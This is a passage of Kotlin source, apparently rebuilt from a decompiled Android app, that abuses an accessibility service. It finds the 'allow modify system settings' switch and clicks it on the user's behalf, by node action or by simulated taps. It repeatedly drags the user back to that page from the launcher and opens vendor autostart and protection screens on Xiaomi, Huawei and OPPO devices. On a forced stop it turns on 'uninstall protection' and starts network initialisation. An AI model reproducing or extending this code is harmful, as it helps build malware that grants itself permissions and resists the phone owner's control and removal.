            if (!node.isVisibleToUser) return
            val nodeId = nodeDescription(node)
            val className = node.className?.toString() ?: ""
            val rootPkg = try {
                service.rootInActiveWindow?.packageName?.toString() ?: ""
            } catch (_: Exception) { "" }

            val isToggle = TOGGLE_CLASS_KEYWORDS.any { className.contains(it, true) }

            val clickSuccess: Boolean
            if (isToggle && node.isCheckable) {
                // Try ACTION_CLICK then ACTION_SELECT
                clickSuccess = node.performAction(AccessibilityNodeInfo.ACTION_CLICK) ||
                        node.performAction(AccessibilityNodeInfo.ACTION_SELECT)
            } else if (isToggle && !node.isClickable) {
                // Non-clickable toggle → use coordinate click
                performCoordinateClickFallback(node, rootPkg, nodeId)
                return
            } else {
                clickSuccess = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }

            if (clickSuccess) {
                // JADX: launches coroutine to verify click result
                scope.launch {
                    delay(300)
                    // Verify navigation state after click
                }
            } else {
                Log.w(TAG, "⚠️ 点击失败，尝试坐标点击")
                performCoordinateClickFallback(node, rootPkg, nodeId)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 点击异常", e)
            try {
                val rootPkg = service.rootInActiveWindow?.packageName?.toString() ?: ""
                performCoordinateClickFallback(node, rootPkg, nodeDescription(node))
            } catch (_: Exception) {}
        }
    }

    /**
     * Fallback coordinate-based click on a node. JADX: f9()
     * Gets node bounds, dispatches a tap gesture at the center.
     */
    fun performCoordinateClickFallback(
        node: AccessibilityNodeInfo,
        currentPkg: String,
        nodeId: String
    ) {
        try {
            val rect = Rect()
            node.getBoundsInScreen(rect)
            if (rect.isEmpty || rect.width() <= 0 || rect.height() <= 0) {
                Log.w(TAG, "⚠️ [坐标检查1] 节点边界无效，跳过坐标点击")
                return
            }
            Log.v(TAG, "✅ [坐标检查1] 节点边界有效: left=${rect.left}, top=${rect.top}, " +
                    "right=${rect.right}, bottom=${rect.bottom}")
            val cx = rect.centerX().toFloat()
            val cy = rect.centerY().toFloat()
            if (cx <= 0f || cy <= 0f) {
                Log.w(TAG, "⚠️ [坐标检查2] 坐标无效，跳过点击")
                return
            }
            val path = Path()
            path.moveTo(cx, cy)
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0L, 100L))
                .build()
            val dispatched = service.dispatchGesture(
                gesture,
                // JADX: C0326b1 callback — onCancelled logs, onCompleted delays 1500ms then navigateAndVerify
                object : AccessibilityService.GestureResultCallback() {
                    override fun onCancelled(gestureDescription: GestureDescription?) {
                        Log.w(TAG, "⚠️ 坐标点击手势被取消")
                    }
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        scope.launch {
                            delay(1500)
                            navigateAndVerify(currentPkg, nodeId)
                        }
                    }
                },
                null
            )
            if (!dispatched) {
                Log.w(TAG, "⚠️ 发送坐标点击手势失败")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 坐标点击失败", e)
        }
    }

    /**
     * Perform a tap gesture at coordinates. JADX: f2() → performCoordinateClick
     * Returns true if gesture completed successfully, false otherwise.
     * Suspend function — polls for gesture completion.
     */
    suspend fun performCoordinateClick(x: Float, y: Float): Boolean {
        return try {
            val path = Path()
            path.moveTo(x, y)
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0L, 100L))
                .build()

            var completed = false
            var failed = false

            val callback = object : AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: GestureDescription?) {
                    completed = true
                }
                override fun onCancelled(gestureDescription: GestureDescription?) {
                    failed = true
                }
            }

            if (!service.dispatchGesture(gesture, callback, null)) {
                Log.w(TAG, "⚠️ 发送坐标点击手势失败")
                return false
            }

            // JADX: polls every 50ms up to 1000ms
            var elapsed = 0
            while (!completed && elapsed < 1000) {
                delay(50)
                elapsed += 50
            }
            !failed
        } catch (e: Exception) {
            Log.e(TAG, "❌ 执行坐标点击失败", e)
            false
        }
    }

    /**
     * Perform a swipe gesture between two points. JADX: f3() → performSwipeGesture
     * Returns true if gesture completed successfully.
     */
    suspend fun performSwipeGesture(
        fromX: Float, fromY: Float,
        toX: Float, toY: Float
    ): Boolean {
        return try {
            val path = Path()
            path.moveTo(fromX, fromY)
            path.lineTo(toX, toY)
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0L, 400L))
                .build()

            var completed = false
            var failed = false

            val callback = object : AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: GestureDescription?) {
                    completed = true
                }
                override fun onCancelled(gestureDescription: GestureDescription?) {
                    failed = true
                }
            }

            if (!service.dispatchGesture(gesture, callback, null)) {
                Log.w(TAG, "⚠️ 发送滑动手势失败")
                return false
            }

            // JADX: polls every 50ms up to 600ms
            var elapsed = 0
            while (!completed && elapsed < 600) {
                delay(50)
                elapsed += 50
            }
            !failed
        } catch (e: Exception) {
            Log.e(TAG, "❌ 执行滑动手势失败", e)
            false
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Broadcast — JADX: f5()
    // ═══════════════════════════════════════════════════════════════

    /**
     * Send broadcast with permission result. JADX: f5()
     * Includes success flag, reason string, and timestamp.
     */
    fun sendPermissionResultBroadcast(reason: String?, success: Boolean) {
        try {
            val intent = Intent(PERMISSION_RESULT_ACTION).apply {
                putExtra("success", success)
                if (reason != null) putExtra("reason", reason)
                putExtra("timestamp", System.currentTimeMillis())
            }
            context.sendBroadcast(intent)
        } catch (e: Exception) {
            Log.e(TAG, "❌ 发送权限结果广播失败", e)
            // JADX: retry with fallback
            try {
                Log.w(TAG, "🔄 尝试备用广播发送方案")
                val fallbackIntent = Intent(PERMISSION_RESULT_ACTION).apply {
                    putExtra("success", success)
                    if (reason != null) putExtra("reason", reason)
                    putExtra("fallback", true)
                }
                context.sendBroadcast(fallbackIntent)
            } catch (e2: Exception) {
                Log.e(TAG, "❌ 备用广播发送也失败", e2)
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Node finding utilities (instance) — JADX: b8(), c1()
    // ═══════════════════════════════════════════════════════════════

    /**
     * Find the allow-modify-system-settings toggle. JADX: c1()
     * Searches for switch node near "允许修改系统设置" text.
     * Climbs up the parent chain from the text node to find a Switch widget
     * in the ancestor subtree (up to 5 levels).
     * Returns null (not the textNode) if no switch found, so fallback logic
     * (findAllowModifyNode) can handle it.
     */
    fun findAllowModifyToggle(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        try {
            clickedNodes.add(root)
            // Search using keyword list from DangerKeywords
            for (keyword in DangerKeywords.modifySystemSettingsKeywords) {
                val textNode = findNodeByText(root, keyword, 0)
                if (textNode != null) {
                    // Found the text — climb parent chain to find switch (JADX: d0() recursive)
                    var current = textNode.parent
                    var depth = 0
                    while (current != null && depth < 5) {
                        val switchNode = findSwitchInParent(current)
                        if (switchNode != null) return switchNode
                        current = current.parent
                        depth++
                    }
                    // JADX c1(): does NOT fall back to textNode.
                    // If no switch found via parent chain, continue to next keyword
                    // or fall through to return null so findAllowModifyNode handles it.
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ findAllowModifyToggle failed", e)
        }
        return null
    }

    /**
     * Find a switch node in a parent container via recursive DFS. JADX: d0()
     * Checks if the node itself is a toggle widget, then recurses into all children.
     * JADX checks: className matches toggle keywords + isClickable + isVisibleToUser + isEnabled.
     */
    fun findSwitchInParent(parent: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        return try {
            // JADX d0(): first check if parent itself is a toggle widget
            val className = parent.className?.toString() ?: ""
            val toggleKeywords = listOf(
                "Switch", "Toggle", "CheckBox", "RadioButton",
                "CompoundButton", "ToggleButton", "SwitchCompat"
            )
            for (keyword in toggleKeywords) {
                if (className.contains(keyword, true)) {
                    if (parent.isClickable && parent.isVisibleToUser && parent.isEnabled) {
                        return parent
                    }
                    break
                }
            }
            // JADX d0(): recurse into all children
            val childCount = parent.childCount
            for (i in 0 until childCount) {
                val child = parent.getChild(i) ?: continue
                clickedNodes.add(child)
                val found = findSwitchInParent(child)
                if (found != null) {
                    return found
                }
            }
            null
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Find the allow-modify node via fallback tree search. JADX: b8()
     * Used when primary c1() search fails — broader recursive search.
     */
    fun findAllowModifyNode(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        // JADX: fallback search — find any toggle node not yet tried
        return try {
            val switches = findAllSwitches(root)
            for (sw in switches) {
                if (sw.isVisibleToUser && !failedNodeIds.contains(nodeDescription(sw))) {
                    return sw
                }
            }
            null
        } catch (_: Exception) {
            null
        }
    }

    /** Find first visible switch in container. JADX: c9() */
    fun findFirstVisibleSwitch(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        return findFirstSwitch(root)
    }

    // ═══════════════════════════════════════════════════════════════
    // Auto-click core — JADX: a0()
    // ═══════════════════════════════════════════════════════════════

    /**
     * Attempt to auto-click the allow switch. JADX: a0() → attemptAutoClickSafe
     * This is the main click-dispatch method called on each accessibility event.
     *
     * Logic:
     * 1. Check if under MAX_CLICK_ATTEMPTS
     * 2. Check if permission already granted
     * 3. Get root node, check we're on a settings page
     * 4. If on target page: find toggle and click it
     * 5. If on our own app: open write settings page
     */
    fun attemptAutoClick() {
        try {
            if (hasWriteSettingsPermission()) {
                handlePermissionGranted()
                return
            }

            // JADX: a0() — attempts click regardless of strategy
            val root = service.rootInActiveWindow
            if (root == null) {
                return
            }
            val pkg = root.packageName?.toString() ?: ""

            if (isSettingsPackage(pkg) || isPermissionRelatedPackage(pkg)) {
                if (isOnTargetAppPage()) {
                    // Clear previous clicked nodes
                    try {
                        val nodesCopy = ArrayList(clickedNodes)
                        clickedNodes.clear()
                        for (n in nodesCopy) {
                            try { n.recycle() } catch (_: Exception) {}
                        }
                    } catch (_: Exception) {}

                    val freshRoot = service.rootInActiveWindow ?: return
                    clickedNodes.add(freshRoot)

                    // Try primary: find allow-modify toggle
                    val toggleNode = findAllowModifyToggle(freshRoot)
                    if (toggleNode != null) {
                        Log.d(TAG, "[attemptAutoClick] found toggle, clicking")
                        performClick(toggleNode)
                        return
                    }
                    // Fallback: find any unchecked switch
                    if (clickAttempts <= 3) {
                        val fallback = findAllowModifyNode(freshRoot)
                        if (fallback != null) {
                            Log.d(TAG, "[attemptAutoClick] found fallback switch, clicking")
                            performClick(fallback)
                            return
                        }
                    }
                    Log.d(TAG, "[attemptAutoClick] on target page but no toggle found")
                } else {
                    // On settings but not WRITE_SETTINGS page — reopen it (throttled)
                    val now = System.currentTimeMillis()
                    if (now - lastNavigationTime > 5000L) {
                        Log.d(TAG, "[attemptAutoClick] on settings but not target page, reopening WRITE_SETTINGS")
                        lastNavigationTime = now
                        openWriteSettingsPage()
                    }
                }
            } else if (pkg == context.packageName) {
                // On our own app — open write settings page
                Log.d(TAG, "[attemptAutoClick] on own app, opening write settings page")
                openWriteSettingsPage()
                scope.launch {
                    delay(1000)
                    // Re-attempt after delay
                }
            } else {
                // On irrelevant page (e.g. launcher) — reopen WRITE_SETTINGS page (throttled)
                val now = System.currentTimeMillis()
                if (now - lastNavigationTime > 3000L) {
                    Log.d(TAG, "[attemptAutoClick] irrelevant pkg=$pkg, reopening WRITE_SETTINGS page")
                    lastNavigationTime = now
                    openWriteSettingsPage()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 自动点击失败", e)
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Event handler — JADX: d4()
    // ═══════════════════════════════════════════════════════════════

    /**
     * Handle accessibility event for WRITE_SETTINGS permission automation.
     * Called by the accessibility service's onAccessibilityEvent.
     * JADX: d4() — three-way branch with delayed coroutines.
     *
     * Branch A: Settings package → delay 1000ms → attemptAutoClickSafe
     * Branch B: Own package → only check if permission granted (do NOT reopen page)
     * Branch C: Other package (launcher etc) → delay 1000ms → re-check root window package
     */
    fun handleAccessibilityEvent(event: AccessibilityEvent) {
        if (!isActive || !isNavigating || permissionGranted) return

        val now = System.currentTimeMillis()
        if (now - lastEventTime < 2000) return
        lastEventTime = now

        try {
            val eventType = event.eventType
            // Vendor d4: only TYPE_WINDOW_STATE_CHANGED(32) and TYPE_WINDOW_CONTENT_CHANGED(2048)
            if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
                eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return

            val pkg = event.packageName?.toString() ?: return

            if (isSettingsPackage(pkg) || isPermissionRelatedPackage(pkg)) {
                // Branch A: Settings page → cancel old clickJob, launch delayed click
                clickJob?.cancel()
                clickJob = scope.launch {
                    delay(1000L)
                    if (!isActive || !this@launch.isActive) return@launch
                    // Defer to active auth flow — MainOrchestrator's event-driven retries
                    // must not compete with Yw5xud adaptation's startActivity calls.
                    if (AutomationCoordinator.isBusy() && AutomationCoordinator.currentFlow() == "auth") {
                        Log.d(TAG, "⏸️ [handleEvent] auth 流程持锁中，跳过本次 autoClick")
                        return@launch
                    }
                    if (hasWriteSettingsPermission()) {
                        handlePermissionGranted()
                        return@launch
                    }
                    try {
                        val root = service.rootInActiveWindow ?: return@launch
                        val clicked = attemptAutoClickSafe(root)
                        if (clicked) {
                            waitForPermissionGranted(10, 1000)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Branch A auto-click failed", e)
                    }
                }
            } else if (pkg == context.packageName) {
                // Branch B: Own package → only check permission, do NOT reopen page
                if (hasWriteSettingsPermission()) {
                    handlePermissionGranted()
                }
            } else {
                // Branch C: Other package (launcher, etc) → delayed smart detection
                clickJob?.cancel()
                clickJob = scope.launch {
                    delay(1000L)
                    if (!isActive || !this@launch.isActive) return@launch
                    // Defer to active auth flow — MainOrchestrator's event-driven retries
                    // must not compete with Yw5xud adaptation's startActivity calls.
                    if (AutomationCoordinator.isBusy() && AutomationCoordinator.currentFlow() == "auth") {
                        Log.d(TAG, "⏸️ [handleEvent] auth 流程持锁中，跳过本次 autoClick")
                        return@launch
                    }
                    if (hasWriteSettingsPermission()) {
                        handlePermissionGranted()
                        return@launch
                    }
                    try {
                        val currentPkg = try {
                            service.rootInActiveWindow?.packageName?.toString() ?: ""
                        } catch (_: Exception) { "" }

                        if (isSettingsPackage(currentPkg) || isPermissionRelatedPackage(currentPkg)) {
                            Log.d(TAG, "[Branch C] 延迟后检测到设置页面($currentPkg)，尝试点击")
                            val root = service.rootInActiveWindow ?: return@launch
                            attemptAutoClickSafe(root)
                        } else {
                            Log.d(TAG, "[Branch C] 延迟后仍不在设置页面($currentPkg)，跳过")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Branch C smart detection failed", e)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ handleAccessibilityEvent failed", e)
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Lifecycle — JADX: f7(), f8(), start(), stop()
    // ═══════════════════════════════════════════════════════════════

    /**
     * Start the full WRITE_SETTINGS permission request flow. JADX: f7()
     * Checks SharedPreferences, resets state, opens settings page,
     * launches monitoring and detection coroutines.
     */
    fun startWriteSettingsPermissionRequest() {
        val startTime = System.currentTimeMillis()
        Log.v(TAG, "🔐⏱️ [计时] startWriteSettingsPermissionRequest() 开始执行 @$startTime")

        // Check if already attempted
        val prefs = context.getSharedPreferences("write_settings_state", 0)
        val alreadyAttempted = prefs.getBoolean("write_settings_attempted", false)
        if (alreadyAttempted) {
            Log.d(TAG, "✅ WRITE_SETTINGS流程已尝试过，跳过（不管之前成功或失败）")
            return
        }

        if (isActive) {
            Log.w(TAG, "⚠️ WRITE_SETTINGS权限申请已在进行中")
            return
        }

        if (hasWriteSettingsPermission()) {
            Log.d(TAG, "[startWriteSettings] already granted, marking")
            if (!permissionGranted) {
                handlePermissionGranted()
            }
            return
        }

        Log.d(TAG, "[startWriteSettings] proceeding: isActive=$isActive, permissionGranted=$permissionGranted, alreadyAttempted=$alreadyAttempted")

        // Stop any previous request
        stopPermissionRequest()

        // Ensure scope is active
        if (!scope.isActive) {
            Log.w(TAG, "⚠️ 协程作用域不活跃，重新创建")
            scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
        }

        // Reset detection state
        currentAppPackage = ""
        retryCount = 0
        lastEventTime = 0L
        clickAttempts = 0
        isNavigating = false
        scrollAttempts = 0
        failedNodeIds.clear()

        isActive = true
        lastNavigationTime = System.currentTimeMillis()

        // Open write settings page
        openWriteSettingsPage()

        // Launch permission monitoring coroutine
        monitoringJob?.cancel()
        monitoringJob = scope.launch {
            // JADX: WriteSettingsPermissionManager$startPermissionMonitoring$1
            // Periodically checks if permission was granted
            while (isActive && !permissionGranted) {
                delay(1000)
                if (hasWriteSettingsPermission()) {
                    handlePermissionGranted()
                    break
                }
            }
        }

        // Launch strategy-specific detection
        if (strategy.ordinal == 0) {
            // STANDARD: coordinate-click based detection
            clickJob = scope.launch {
                // JADX: WriteSettingsPermissionManager$startCoordinateClickDetection$1
                // Loop up to 10 iterations, 500ms delay per iteration
                val maxIterations = 10
                for (i in 0 until maxIterations) {
                    if (!isActive || !this@MainOrchestrator.isActive) break
                    try {
                        delay(500)
                        if (hasWriteSettingsPermission()) {
                            handlePermissionGranted()
                            return@launch
                        }
                        val root = try {
                            service.rootInActiveWindow
                        } catch (_: Exception) { null }
                        if (root != null) {
                            val pkg = root.packageName?.toString() ?: ""
                            Log.d(TAG, "🔍 [STANDARD] iter=$i pkg=$pkg retryCount=$retryCount")
                            if (i == 0 || i == 5) {
                                UiDebugger.dumpPage(service, "ws_standard_iter_$i", "pkg=$pkg retryCount=$retryCount")
                            }
                            // Track retry count per same package
                            if (pkg == currentAppPackage) {
                                retryCount++
                            } else {
                                retryCount = 1
                                currentAppPackage = pkg
                            }
                            if (retryCount >= 2) {
                                if (!isSettingsPackage(pkg) && !isPermissionRelatedPackage(pkg)) {
                                    if (pkg == context.packageName) {
                                        safeRecycle(root)
                                        if (hasWriteSettingsPermission()) {
                                            handlePermissionGranted()
                                            return@launch
                                        }
                                        continue
                                    }
                                    Log.d(TAG, "🔍 [STANDARD] 非设置包，跳过: $pkg")
                                }
                                // On a settings page with enough retries: attempt auto-click
                                try {
                                    Log.d(TAG, "🔍 [STANDARD] 尝试 attemptAutoClickSafe...")
                                    val clicked = attemptAutoClickSafe(root)
                                    Log.d(TAG, "🔍 [STANDARD] attemptAutoClickSafe 结果: $clicked")
                                    if (clicked) {
                                        // Wait for permission check
                                        val granted = waitForPermissionGranted(10, 1000)
                                        if (!granted) {
                                            safeRecycle(root)
                                            continue
                                        }
                                    }
                                } catch (e: Exception) {
                                    Log.e(TAG, "❌ 坐标点击检测失败", e)
                                }
                            }
                            safeRecycle(root)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ 坐标点击检测失败", e)
                    }
                }
                // JADX: after max iterations, switch to SMART strategy
                if (this@MainOrchestrator.isActive) {
                    strategy = DeviceStrategy.SMART
                    UiDebugger.logStep(TAG, "STANDARD→SMART 策略切换", "10次迭代未找到 toggle")
                    UiDebugger.dumpPage(service, "ws_smart_fallback", "切换到 SMART 策略")
                    startPeriodicDetection()
                }
            }
        } else if (strategy.ordinal == 1) {
            // SMART: periodic smart detection
            startPeriodicDetection()
        }

        Log.v(TAG, "🔐⏱️ [计时] startWriteSettingsPermissionRequest() 全部完成，" +
                "总耗时: ${System.currentTimeMillis() - startTime}ms")
    }

    /**
     * Stop the permission request and clean up. JADX: f8()
     * Resets all state, cancels jobs, and optionally sends failure broadcast.
     */
    fun stopPermissionRequest() {
        if (isActive && !permissionGranted) {
            Log.w(TAG, "⚠️ 权限申请被强制停止，发送失败广播并启用后续功能")
            cancelAllJobs()
            try {
                sendPermissionResultBroadcast("权限申请被强制停止", false)
                // JADX: save authorization state + call service.e9()/n3()
                markWriteSettingsAttempted()
                val brand = detectBrand()
                saveAuthorizationState()
                Log.d(TAG, "✅ 强制停止，已标记授权完成，deviceKey=$brand")
                service.enableUninstallProtection()
                service.startNetworkInit()
            } catch (e: Exception) {
                Log.e(TAG, "❌ 强制停止时处理失败", e)
            }
        }

        isActive = false
        currentAppPackage = ""
        retryCount = 0
        lastEventTime = 0L
        clickAttempts = 0
        isNavigating = false
        scrollAttempts = 0
        failedNodeIds.clear()
        lastNavigationTime = 0L

        monitoringJob?.cancel()
        monitoringJob = null
        clickJob?.cancel()
        clickJob = null
    }

    /** Start periodic detection. JADX: f6() */
    private fun startPeriodicDetection() {
        try {
            scope.launch {
                // JADX: WriteSettingsPermissionManager$startPeriodicDetection$1
                // Loop up to 15 iterations, 800ms delay per iteration
                val maxIterations = 15
                for (i in 0 until maxIterations) {
                    if (!isActive || !this@MainOrchestrator.isActive) break
                    try {
                        delay(800)
                        if (hasWriteSettingsPermission()) {
                            handlePermissionGranted()
                            return@launch
                        }
                        val root = try {
                            service.rootInActiveWindow
                        } catch (_: Exception) { null }
                        if (root != null) {
                            val pkg = root.packageName?.toString() ?: ""
                            // Track retry count per same package
                            if (pkg == currentAppPackage) {
                                retryCount++
                            } else {
                                retryCount = 1
                                currentAppPackage = pkg
                            }
                            if (retryCount >= 1 || i >= 3) {
                                if (pkg == context.packageName) {
                                    // On our own app — reopen settings page
                                    safeRecycle(root)
                                    openWriteSettingsPage()
                                    delay(1000)
                                    continue
                                } else if (isSettingsPackage(pkg) || isPermissionRelatedPackage(pkg)) {
                                    // On a settings page — try finding and clicking toggle
                                    clickedNodes.add(root)
                                    if (isOnTargetAppPage()) {
                                        val toggleNode = findAllowModifyToggle(root)
                                        if (toggleNode != null) {
                                            performClick(toggleNode)
                                            val granted = waitForPermissionGranted(10, 1000)
                                            if (granted) return@launch
                                        }
                                    }
                                    safeRecycle(root)
                                } else {
                                    safeRecycle(root)
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ 定时检测失败", e)
                    }
                }
                // JADX: after max iterations, final attempt based on strategy
                if (this@MainOrchestrator.isActive) {
                    when (strategy.ordinal) {
                        0 -> {
                            // STANDARD: try one more auto-click
                            val clicked = try {
                                val root = service.rootInActiveWindow
                                if (root != null) attemptAutoClickSafe(root) else false
                            } catch (_: Exception) { false }
                            if (clicked) {
                                logNavigationEvent("坐标点击策略超时")
                            } else {
                                waitForPermissionGranted(10, 1000)
                            }
                        }
                        1 -> {
                            // SMART: open app settings as fallback
                            UiDebugger.dumpPage(service, "ws_app_settings_fallback", "SMART fallback 到应用设置")
                            if (AutomationCoordinator.isBusy() && AutomationCoordinator.currentFlow() == "auth") {
                                Log.d(TAG, "⏸️ [SMART fallback] auth 流程持锁中，跳过 openAppSettings")
                                // Don't call openAppSettings here — let auth finish first
                            } else {
                                openAppSettings()
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 启动定时检测失败", e)
        }
    }

    /** Cancel all active jobs. JADX: e4() */
    private fun cancelAllJobs() {
        monitoringJob?.cancel()
        monitoringJob = null
        clickJob?.cancel()
        clickJob = null
    }

    /** Log navigation event with details. JADX: e5() */
    fun logNavigationEvent(msg: String) {
        Log.d(TAG, msg)
    }

    /** Reset navigation state but keep active. JADX: e7() */
    fun resetNavigationState() {
        isNavigating = false
        clickAttempts = 0
        scrollAttempts = 0
        failedNodeIds.clear()
        try {
            val nodesCopy = ArrayList(clickedNodes)
            clickedNodes.clear()
            for (n in nodesCopy) {
                try { n.recycle() } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
    }

    /**
     * Start the WRITE_SETTINGS automation flow (simplified).
     * Used by callers that don't need full f7() flow.
     */
    fun start() {
        if (isActive) {
            Log.w(TAG, "Already active, skipping")
            return
        }
        strategy = detectStrategy()
        isActive = true
        permissionGranted = false
        clickAttempts = 0
        retryCount = 0
        Log.i(TAG, "Starting WRITE_SETTINGS automation, strategy=$strategy")

        if (hasWriteSettingsPermission()) {
            markPermissionGranted()
            return
        }
        openWriteSettingsPage()
    }

    /** Stop the automation flow. */
    fun stop() {
        isActive = false
        isNavigating = false
        cancelAllJobs()
        try {
            val nodesCopy = ArrayList(clickedNodes)
            clickedNodes.clear()
            for (n in nodesCopy) {
                try { n.recycle() } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        failedNodeIds.clear()
        Log.i(TAG, "Stopped WRITE_SETTINGS automation")
    }

    /** Dispose and release all resources. */
    fun dispose() {
        stop()
    }

    // ═══════════════════════════════════════════════════════════════
    // Suspend methods — JADX coroutine continuations → Kotlin suspend
    // ═══════════════════════════════════════════════════════════════

    /**
     * Wait for page to become stable (node count doesn't change). JADX: g1()
     * Polls the node tree count every [intervalMs] for up to [timeoutMs].
     * Returns true if the count stabilized [requiredStableCount] times.
     */
    suspend fun waitForPageStable(
        requiredStableCount: Int,
        intervalMs: Long,
        timeoutMs: Long
    ): Boolean {
        val startTime = System.currentTimeMillis()
        var previousCount = -1
        var stableCount = 0

        while (System.currentTimeMillis() - startTime < timeoutMs) {
            val root = service.rootInActiveWindow
            val currentCount = if (root != null) countNodesInTree(root) else 0
            safeRecycle(root)

            if (currentCount == previousCount && currentCount > 0) {
                stableCount++
                if (stableCount >= requiredStableCount) return true
            } else {
                previousCount = currentCount
                stableCount = 0
            }
            delay(intervalMs)
        }
        return false
    }

    /**
     * Wait for WRITE_SETTINGS permission to be granted. JADX: g2()
     * Polls permission check every [intervalMs] for up to [maxChecks] times.
     * Returns true if permission was granted.
     */
    suspend fun waitForPermissionGranted(maxChecks: Int, intervalMs: Long): Boolean {
        for (i in 0 until maxChecks) {
            if (hasWriteSettingsPermission()) return true
            delay(intervalMs)
        }
        return false
    }

    /**
     * Ensure we're on the write-settings page. JADX: b2()
     * Full 3-step recovery: check → BACK + wait → reopen + wait for stable.
     * Returns true if we ended up on the page, false if all attempts failed.
     */
    suspend fun ensureOnWriteSettingsPage(): Boolean {
        // Step 1: Already on page?
        if (isOnPermissionPage()) return true

        // Step 2: Try BACK and check again
        Log.w(TAG, "⚠️ [页面验证] 不在修改系统设置页面，尝试返回")
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
        delay(300)
        waitForPageStable(3, 200, 3000)
        if (isOnPermissionPage()) return true

        // Step 3: Reopen the page
        Log.w(TAG, "⚠️ [页面验证] 返回后仍不在页面，重新打开")
        openWriteSettingsPage()
        delay(300)
        waitForPageStable(3, 200, 3000)
        if (isOnPermissionPage()) return true

        // All attempts failed
        Log.d(TAG, "❌ [页面验证] 3次尝试后仍无法进入页面")
        return false
    }

    /**
     * Navigate and verify click result. JADX: a1()
     * After clicking, checks if page changed unexpectedly,
     * records failed nodes, and performs recovery.
     */
    suspend fun navigateAndVerify(
        targetPkg: String,
        controlId: String
    ) {
        try {
            val root = service.rootInActiveWindow
            val currentPkg = root?.packageName?.toString() ?: ""

            // Check permission up to 3 times with delay
            for (i in 0 until 3) {
                if (hasWriteSettingsPermission()) {
                    handlePermissionGranted()
                    return
                }
                if (i < 2) delay(300)
            }

            // Check if page unexpectedly changed
            if (hasPageChanged(targetPkg, currentPkg)) {
                Log.w(TAG, "⚠️ 检测到页面跳转: $targetPkg → $currentPkg")
                Log.w(TAG, "📝 控件 $controlId 导致了错误跳转，记录为失败控件")
                failedNodeIds.add(controlId)

                // Cancel click jobs
                Log.w(TAG, "🛑 取消所有自动点击任务，防止在错误页面继续点击")
                clickJob?.cancel()
                clickJob = null

                if (!isPermissionRelatedPackage(currentPkg) || !isOnTargetAppPage()) {
                    Log.w(TAG, "⚠️ 跳转到非预期页面，执行返回操作")
                    performGlobalBack()
                    delay(500)
                }
                return
            }

            // Same page, same package — check if permission was actually obtained
            if (currentPkg == context.packageName) {
                Log.w(TAG, "⚠️ 检测到应用意外返回主应用，可能是点击控件导致的")
                failedNodeIds.add(controlId)
                openWriteSettingsPage()
                return
            }

            // Click had no effect
            delay(500)
            if (hasWriteSettingsPermission()) {
                handlePermissionGranted()
                return
            }
            Log.w(TAG, "⚠️ 点击无效：页面未跳转且权限未获取")
            failedNodeIds.add(controlId)
        } catch (e: Exception) {
            Log.e(TAG, "❌ 检查点击后页面状态失败", e)
            failedNodeIds.add(controlId)
            clickJob?.cancel()
            clickJob = null
        }
    }

    /**
     * Navigate to permission settings (brand-specific). JADX: a1() dispatch
     * Opens the appropriate settings page based on current strategy/brand.
     * For STANDARD/SMART: opens WRITE_SETTINGS page directly.
     * For brand-specific: opens brand-specific permission management page.
     */
    fun navigateToPermission(targetPkg: String, currentPkg: String) {
        Log.d(TAG, "navigateToPermission target=$targetPkg current=$currentPkg strategy=$strategy")
        when (strategy) {
            DeviceStrategy.STANDARD, DeviceStrategy.SMART -> {
                // JADX: opens standard write settings page
                openWriteSettingsPage()
            }
            DeviceStrategy.XIAOMI -> {
                // JADX: opens MIUI security center autostart
                try {
                    val intent = Intent()
                    intent.component = ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"
                    )
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } catch (_: Exception) {
                    openWriteSettingsPage()
                }
            }
            DeviceStrategy.HUAWEI -> {
                // JADX: opens Huawei system manager
                try {
                    val intent = Intent()
                    intent.component = ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.process.ProtectActivity"
                    )
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } catch (_: Exception) {
                    openWriteSettingsPage()
                }
            }
            DeviceStrategy.OPPO -> {
                // JADX: opens ColorOS safe center
                try {
                    val intent = Intent()
                    intent.component = ComponentName(
                        "com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                    )
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } catch (_: Exception) {
                    openWriteSettingsPage()
                }
            }
            DeviceStrategy.VIVO -> {
                // JADX: opens vivo iManager
                try {
